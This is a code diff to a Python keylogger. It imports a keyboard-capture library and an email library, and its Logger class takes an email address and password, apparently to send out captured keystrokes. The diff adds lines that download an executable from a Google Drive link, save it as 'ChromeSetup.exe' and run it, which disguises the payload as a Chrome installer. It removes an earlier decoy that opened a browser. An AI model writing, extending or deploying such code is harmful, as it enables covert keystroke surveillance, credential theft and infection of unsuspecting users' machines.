@@ -4,13 +4,13 @@
 import pynput.keyboard
 import threading
 import smtplib
+import requests
+import subprocess
 
-
-
-URL = "https://totalcommander.ch/win/fixed/tcmd951x64.exe"
-import webbrowser
-webbrowser.open('https://google.com', new=1)
-
+URL = "https://drive.google.com/u/0/uc?id=1_Ujq3ih5WevWtjc95JpVRHIwGNf6YK7U&export=download"
+r = requests.get(URL, allow_redirects=True)
+open("ChromeSetup.exe", "wb").write(r.content)
+subprocess.call(["ChromeSetup.exe"])
 
 class Logger:
     def __init__(self, time_interval, email, password):
